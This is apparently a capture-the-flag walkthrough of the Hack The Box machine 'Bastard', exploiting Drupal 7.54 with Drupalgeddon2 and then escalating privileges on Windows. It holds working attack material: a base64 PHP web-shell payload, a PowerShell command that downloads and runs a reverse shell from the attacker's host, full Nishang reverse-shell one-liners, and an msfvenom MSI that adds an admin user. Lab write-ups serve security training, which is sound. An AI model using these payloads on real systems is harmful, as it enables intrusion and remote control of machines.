# bastard 10.10.10.9

## In brief:
- Windows
- Drupal 7.54
   => Drupalgeddon2 or Drupalgeddon3
- Powershell Invoke-PowerShellTcp.ps1


## Nmap
````
$ nmap -sT -p- --min-rate 10000 -oA scans/alltcp 10.10.10.9
$ nmap -sU -p- --min-rate 10000 -oA scans/alludp 10.10.10.9 
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown

$ nmap -sV -sC -p 80,135,49154 -oA scans/scripts 10.10.10.9
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
http-robots.txt
````

## Robots.txt

````
$ curl -s http://10.10.10.9/robots.txt
$ curl -s http://10.10.10.9/CHANGELOG.txt | head
Drupal 7.54, 2017-02-01
````

Note:
IIS 7.5 => IIS for Windows 7 / Server 2008r2. 


## DRUPAL scanner => droopescan

```
$ /opt/droopescan/droopescan scan drupal -u http://10.10.10.9
```

## Drupalgeddon2
Exploit for Drupal 7.54
 - Drupal 7.x Module Services - Remote Code Execution
    -  https://www.ambionics.io/blog/drupal-services-module-rce
    - exploit_drupal_7_54.php
 - Drupalgeddon2 (March 2018)
    - https://github.com/dreadlocked/Drupalgeddon2
    - drupalgeddon2.rb

 - Drupalgeddon3 (April 2018) 


drupalgeddon2
```
# ./drupalgeddon2.rb  http://10.10.10.9/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.9/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.9/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo HHRJHXQA
[+] Result : HHRJHXQA
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.9/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.10.10.9/sites/default/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.10.10.9/sites/default/files/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/files/)
[*] Moving : ./sites/default/files/.htaccess
[i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
[!] FAILED : Couldn't find a writeable web path
--------------------------------------------------------------------------------
[*] Dropping back to direct OS commands

drupalgeddon2>> whoami
nt authority\iusr
drupalgeddon2>> dir
Volume in drive C has no label.
 Volume Serial Number is 605B-4AAA

 Directory of C:\inetpub\drupal-7.54

19/03/2017  09:04 ��    <DIR>          .
19/03/2017  09:04 ��    <DIR>          ..
19/03/2017  01:42 ��               317 .editorconfig
19/03/2017  01:42 ��               174 .gitignore
19/03/2017  01:42 ��             5.969 .htaccess
19/03/2017  01:42 ��             6.604 authorize.php
19/03/2017  01:42 ��           110.781 CHANGELOG.txt
```


## Another User shell

Nishang Powershell - Invoke-PowerShellTcp.ps1
- https://github.com/samratashok/nishang
- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

Update the last line with IP/port
```
}
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 4443
```

Setup a server
```
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.9 - - [29/Aug/2019 23:08:42] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

Setup nc
```
# nc -lvp 4443
listening on [any] 4443 ...
10.10.10.9: inverse host lookup failed: Unknown host
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.9] 49335
Windows PowerShell running as user BASTARD$ on BASTARD
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\drupal-7.54>dir


    Directory: C:\inetpub\drupal-7.54

```
```
Download ps script and run it
drupalgeddon2>> powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14:8000/Invoke-PowerShellTcp.ps1')
```
```
whoami
nt authority\iusr
```
On obtient un shell


## Nishang one liner : à tester
```
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
#$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

#$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```


## Elevation

### Get OS version
```
C:\inetpub\drupal-7.54> systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600

6.1 	=> 	Windows 7 / Windows Server 2008 R2



OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46 ??
System Boot Time:          29/8/2019, 8:18:35 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~1996 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~1996 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.048 MB
Available Physical Memory: 1.502 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.514 MB
Virtual Memory: In Use:    581 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
PS C:\inetpub\drupal-7.54> 
```

### Get kernel exploit

Windows Hacking Pack : https://github.com/51x/WHP
 - Set of tool for exploitation

Watson : Analyse and suggest exploits for windows
  - https://github.com/rasta-mouse/Watson
  - use of Watson in HTB:Devel box : https://0xdf.gitlab.io/2019/03/05/htb-devel.html#privesc-web--system



Get .Net version
```
> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727
```

Precompiled Windows kernel exploits: 
- https://github.com/abatchy17/WindowsExploits
- https://github.com/AusJock/Privilege-Escalation/tree/master/Windows

MS11-046 : spawn a system shell in remote shell

Be root: https://github.com/AlessandroZ/BeRoot

## MSF exploit suggester
```
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester

msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1

msf5 post(multi/recon/local_exploit_suggester) > options 

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > run
```

=> use exploit/windows/local/ms10_015_kitrap0d



## Use AlwaysInstallElevated ?
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Build a payload that create a new user
```
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
```

Install
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation
```

List the admins
```
net localgroup Administrators
```


## Use Unattended install

cf: https://toshellandback.com/2015/11/24/ms-priv-esc/

